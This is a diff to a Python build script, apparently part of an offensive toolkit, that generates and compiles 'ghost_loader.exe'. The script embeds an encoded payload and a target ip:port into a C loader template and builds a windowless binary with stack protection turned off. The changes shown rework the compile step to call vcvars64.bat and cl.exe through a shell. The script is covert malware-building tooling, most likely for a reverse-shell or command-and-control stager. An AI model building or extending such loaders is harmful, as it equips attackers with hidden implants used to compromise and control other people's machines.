@@ -28,6 +28,11 @@ TEMPLATE    = os.path.join(SHELL_DIR, "ghost_loader_template.c")
 OUTPUT_C    = os.path.join(SHELL_DIR, "ghost_loader_gen.c")
 OUTPUT_EXE  = os.path.join(SHELL_DIR, "ghost_loader.exe")
 
+try:
+    from cheyanne_config import VCVARS
+except ImportError:
+    VCVARS = r"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
+
 GREEN  = "\033[92m"
 RED    = "\033[91m"
 AMBER  = "\033[93m"
@@ -50,7 +55,7 @@ def err(msg):
 
 
 def build(ip, port):
-    print(f"\n  {CYAN}{BOLD}═══ GHOST LOADER BUILD — {ip}:{port} ═══{RST}\n")
+    print(f"\n  {CYAN}{BOLD}=== GHOST LOADER BUILD --- {ip}:{port} ==={RST}\n")
 
     # ── Step 1: verify ghost-encoder present ──────────────────────────────
     if not os.path.exists(GHOST_SCRIPT):
@@ -100,18 +105,20 @@ def build(ip, port):
         f.write(c_source)
     log("C source generated with embedded payload")
 
-    # ── Step 6: compile ───────────────────────────────────────────────────
+    # ── Step 6: compile via vcvars + cl.exe ───────────────────────────────
     log("Compiling ghost_loader.exe...")
-    compile_cmd = [
-        "cl.exe",
-        os.path.basename(OUTPUT_C),
-        f"/Fe:{OUTPUT_EXE}",
-        "/O1", "/GS-", "/utf-8",
-        "/link", "/SUBSYSTEM:WINDOWS"
-    ]
+    if not os.path.exists(VCVARS):
+        err(f"vcvars64.bat not found: {VCVARS}")
+        return False
+
+    gen_name = os.path.basename(OUTPUT_C)
+    cmd = (f'"{VCVARS}" && cd /d "{SHELL_DIR}" && '
+           f'cl.exe "{gen_name}" /Fe:"{OUTPUT_EXE}" /O1 /GS- /utf-8 '
+           f'/link /SUBSYSTEM:WINDOWS')
     result = subprocess.run(
-        compile_cmd, cwd=SHELL_DIR,
-        capture_output=True, text=True
+        cmd, shell=True, cwd=SHELL_DIR,
+        capture_output=True, text=True,
+        encoding="utf-8", errors="replace"
     )
 
     # clean up intermediate files
